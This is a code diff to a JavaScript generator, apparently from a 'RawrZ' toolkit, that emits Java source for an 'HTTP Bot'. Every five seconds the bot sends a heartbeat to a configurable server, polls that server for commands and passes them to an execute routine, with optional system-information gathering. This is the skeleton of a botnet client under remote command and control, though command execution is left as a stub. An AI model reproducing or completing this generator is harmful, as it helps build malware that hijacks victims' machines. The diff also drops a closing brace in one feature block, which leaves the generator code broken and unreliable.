@@ -1045,99 +1045,99 @@ class HTTPBotGenerator {
     generateJavaHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateJavaFeatures(features);
         
-        return `// RawrZ HTTP Bot - Java Implementation (Cross-platform)
-// Generated: ${timestamp}
-// Bot ID: ${botId}
-
-package com.rawrz.httpbot;
-
-import java.io.*;
-import java.net.*;
-import java.util.*;
-import java.util.concurrent.*;
-import javax.json.*;
-
-public class RawrZHTTPBot {
-    private final String serverUrl = "${config.server || 'http://localhost:8080'}";
-    private final String botId = "${botId}";
-    private final String botName = "${config.name || 'HTTPBot'}";
-    private boolean isRunning = false;
-    private ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
-    
-    public void run() {
-        System.out.println("RawrZ HTTP Bot " + botId + " starting...");
-        isRunning = true;
-        
-        ${featureCode.init}
-        
-        // Schedule periodic tasks
-        scheduler.scheduleAtFixedRate(() -> {
-            try {
-                sendHeartbeat();
-                checkForCommands();
-                ${featureCode.execute}
-            } catch (Exception e) {
-                System.err.println("Error in bot loop: " + e.getMessage());
-            }
-        }, 0, 5, TimeUnit.SECONDS);
-    }
-    
-    private void sendHeartbeat() {
-        JsonObject data = Json.createObjectBuilder()
-            .add("bot_id", botId)
-            .add("status", "alive")
-            .add("timestamp", System.currentTimeMillis())
-            .build();
-        sendHTTPRequest("/bot/heartbeat", data.toString());
-    }
-    
-    private void checkForCommands() {
-        String response = sendHTTPRequest("/bot/commands/" + botId, null);
-        if (response != null && !response.isEmpty()) {
-            executeCommand(response);
-        }
-    }
-    
-    private void executeCommand(String command) {
-        System.out.println("Executing command: " + command);
-        // Command execution logic here
-    }
-    
-    private String sendHTTPRequest(String endpoint, String data) {
-        try {
-            URL url = new URL(serverUrl + endpoint);
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setRequestMethod(data != null ? "POST" : "GET");
-            connection.setRequestProperty("Content-Type", "application/json");
-            
-            if (data != null) {
-                connection.setDoOutput(true);
-                try (OutputStream os = connection.getOutputStream()) {
-                    os.write(data.getBytes());
-                }
-            }
-            
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
-                StringBuilder response = new StringBuilder();
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    response.append(line);
-                }
-                return response.toString();
-            }
-        } catch (Exception e) {
-            System.err.println("HTTP request failed: " + e.getMessage());
-            return "";
-        }
-    }
-    
-    " + featureCode.methods + "
-    
-    public static void main(String[] args) {
-        RawrZHTTPBot bot = new RawrZHTTPBot();
-        bot.run();
-    }
-}";
+        return '// RawrZ HTTP Bot - Java Implementation (Cross-platform)\n' +
+            '// Generated: ' + timestamp + '\n' +
+            '// Bot ID: ' + botId + '\n' +
+            '\n' +
+            'package com.rawrz.httpbot;\n' +
+            '\n' +
+            'import java.io.*;\n' +
+            'import java.net.*;\n' +
+            'import java.util.*;\n' +
+            'import java.util.concurrent.*;\n' +
+            'import javax.json.*;\n' +
+            '\n' +
+            'public class RawrZHTTPBot {\n' +
+            '    private final String serverUrl = "' + (config.server || 'http://localhost:8080') + '";\n' +
+            '    private final String botId = "' + botId + '";\n' +
+            '    private final String botName = "' + (config.name || 'HTTPBot') + '";\n' +
+            '    private boolean isRunning = false;\n' +
+            '    private ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);\n' +
+            '    \n' +
+            '    public void run() {\n' +
+            '        System.out.println("RawrZ HTTP Bot " + botId + " starting...");\n' +
+            '        isRunning = true;\n' +
+            '        \n' +
+            '        ' + featureCode.init + '\n' +
+            '        \n' +
+            '        // Schedule periodic tasks\n' +
+            '        scheduler.scheduleAtFixedRate(() -> {\n' +
+            '            try {\n' +
+            '                sendHeartbeat();\n' +
+            '                checkForCommands();\n' +
+            '                ' + featureCode.execute + '\n' +
+            '            } catch (Exception e) {\n' +
+            '                System.err.println("Error in bot loop: " + e.getMessage());\n' +
+            '            }\n' +
+            '        }, 0, 5, TimeUnit.SECONDS);\n' +
+            '    }\n' +
+            '    \n' +
+            '    private void sendHeartbeat() {\n' +
+            '        JsonObject data = Json.createObjectBuilder()\n' +
+            '            .add("bot_id", botId)\n' +
+            '            .add("status", "alive")\n' +
+            '            .add("timestamp", System.currentTimeMillis())\n' +
+            '            .build();\n' +
+            '        sendHTTPRequest("/bot/heartbeat", data.toString());\n' +
+            '    }\n' +
+            '    \n' +
+            '    private void checkForCommands() {\n' +
+            '        String response = sendHTTPRequest("/bot/commands/" + botId, null);\n' +
+            '        if (response != null && !response.isEmpty()) {\n' +
+            '            executeCommand(response);\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    private void executeCommand(String command) {\n' +
+            '        System.out.println("Executing command: " + command);\n' +
+            '        // Command execution logic here\n' +
+            '    }\n' +
+            '    \n' +
+            '    private String sendHTTPRequest(String endpoint, String data) {\n' +
+            '        try {\n' +
+            '            URL url = new URL(serverUrl + endpoint);\n' +
+            '            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n' +
+            '            connection.setRequestMethod(data != null ? "POST" : "GET");\n' +
+            '            connection.setRequestProperty("Content-Type", "application/json");\n' +
+            '            \n' +
+            '            if (data != null) {\n' +
+            '                connection.setDoOutput(true);\n' +
+            '                try (OutputStream os = connection.getOutputStream()) {\n' +
+            '                    os.write(data.getBytes());\n' +
+            '                }\n' +
+            '            }\n' +
+            '            \n' +
+            '            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n' +
+            '                StringBuilder response = new StringBuilder();\n' +
+            '                String line;\n' +
+            '                while ((line = reader.readLine()) != null) {\n' +
+            '                    response.append(line);\n' +
+            '                }\n' +
+            '                return response.toString();\n' +
+            '            }\n' +
+            '        } catch (Exception e) {\n' +
+            '            System.err.println("HTTP request failed: " + e.getMessage());\n' +
+            '            return "";\n' +
+            '        }\n' +
+            '    }\n' +
+            '    \n' +
+            '    ' + featureCode.methods + '\n' +
+            '    \n' +
+            '    public static void main(String[] args) {\n' +
+            '        RawrZHTTPBot bot = new RawrZHTTPBot();\n' +
+            '        bot.run();\n' +
+            '    }\n' +
+            '}';
     }
 
     generateJavaFeatures(features) {
@@ -1174,32 +1174,31 @@ public class RawrZHTTPBot {
         if (features.includes('systemInfo')) {
             init += '        initializeSystemInfo();\n';
             execute += '                executeSystemInfo();\n';
-            methods += '    private void initializeSystemInfo() {
-        System.out.println("System Info initialized");
-        System.out.println("OS: " + System.getProperty("os.name"));
-        System.out.println("Version: " + System.getProperty("os.version"));
-        System.out.println("Architecture: " + System.getProperty("os.arch"));
-    }
-    
-    private void executeSystemInfo() {
-        // System information gathering
-    }
-    
-    ';
-        }
+            methods += '    private void initializeSystemInfo() {\n' +
+                '        System.out.println("System Info initialized");\n' +
+                '        System.out.println("OS: " + System.getProperty("os.name"));\n' +
+                '        System.out.println("Version: " + System.getProperty("os.version"));\n' +
+                '        System.out.println("Architecture: " + System.getProperty("os.arch"));\n' +
+                '    }\n' +
+                '    \n' +
+                '    private void executeSystemInfo() {\n' +
+                '        // System information gathering\n' +
+                '    }\n' +
+                '    \n' +
+                '    ';
         
         if (features.includes('httpComm')) {
             init += '        initializeHTTPComm();\n';
             execute += '                executeHTTPComm();\n';
-            methods += '    private void initializeHTTPComm() {
-        System.out.println("HTTP Communication initialized");
-    }
-    
-    private void executeHTTPComm() {
-        // HTTP communication operations
-    }
-    
-    ';
+            methods += '    private void initializeHTTPComm() {\n' +
+                '        System.out.println("HTTP Communication initialized");\n' +
+                '    }\n' +
+                '    \n' +
+                '    private void executeHTTPComm() {\n' +
+                '        // HTTP communication operations\n' +
+                '    }\n' +
+                '    \n' +
+                '    ';
         }
         
         return { init, execute, methods };
